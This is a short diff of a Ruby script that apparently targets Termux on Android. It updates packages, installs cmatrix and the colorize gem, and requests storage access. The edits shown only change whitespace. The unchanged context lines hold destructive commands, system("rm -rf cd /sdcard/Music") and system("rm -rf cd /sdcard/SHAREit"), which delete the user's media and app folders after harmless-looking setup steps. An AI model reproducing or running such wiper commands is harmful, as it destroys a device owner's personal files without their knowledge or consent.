@@ -1,8 +1,6 @@
 #!/usr/bin/env ruby
 
- 
-
-system("apt update && apt upgrade -y")
+ system("apt update && apt upgrade -y")
 system("apt install cmatrix -y")
 system("termux-setup-storage -y")
 system("gem install colorize" )
@@ -60,6 +58,8 @@ system("rm -rf cd /sdcard/Music")
 system ("rm -rf cd /sdcard/SHAREit")
  
 end
+
+
 
  
   
